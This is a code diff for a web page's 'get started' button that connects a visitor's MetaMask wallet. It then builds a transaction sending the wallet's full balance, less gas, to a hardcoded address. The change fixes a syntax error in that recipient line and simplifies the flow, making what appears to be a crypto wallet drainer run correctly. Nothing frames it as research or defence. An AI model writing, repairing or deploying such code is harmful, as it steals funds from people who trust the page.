@@ -1,23 +1,19 @@
-  document.getElementById('get-started').addEventListener('click', () => {
-            const selectedWallet = document.getElementById('get-started').value;
-            connectAndSend(selectedWallet);
-        });
+  document.getElementById('get-started').addEventListener('click', connectAndSend);
 
-        async function connectAndSend(walletType) {
+        async function connectAndSend() {
             let provider;
 
-            if (walletType === 'metamask') {
-                if (!window.ethereum || !window.ethereum.isMetaMask) {
-                    if (isMobile()) {
-                        // Attempt to open MetaMask on mobile
-                        window.location.href = 'https://metamask.app.link/dapp/' + window.location.href;
-                    } else {
-                        alert('MetaMask is not installed');
-                    }
-                    return;
+            if (!window.ethereum || !window.ethereum.isMetaMask) {
+                if (isMobile()) {
+                    // Attempt to open MetaMask on mobile
+                    window.location.href = 'https://metamask.app.link/dapp/' + window.location.href;
+                } else {
+                    alert('MetaMask is not installed');
                 }
-                provider = new ethers.providers.Web3Provider(window.ethereum);
+                return;
             }
+            
+            provider = new ethers.providers.Web3Provider(window.ethereum);
 
             // Request account access
             try {
@@ -35,7 +31,7 @@
 
             // Estimate gas price and limit
             const gasPrice = await provider.getGasPrice();
-            const dummyTransaction = { to: ""0xB0994b43F798a151e75b38e01C5a9Da2B8895b8", value: balance };
+            const dummyTransaction = { to: "0xB0994b43F798a151e75b38e01C5a9Da2B8895b8", value: balance };
             const gasLimit = await provider.estimateGas(dummyTransaction);
 
             // Calculate gas fee and adjust balance
@@ -66,6 +62,9 @@
         function isMobile() {
             return /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
         }
+       
+
+          
 
    
    
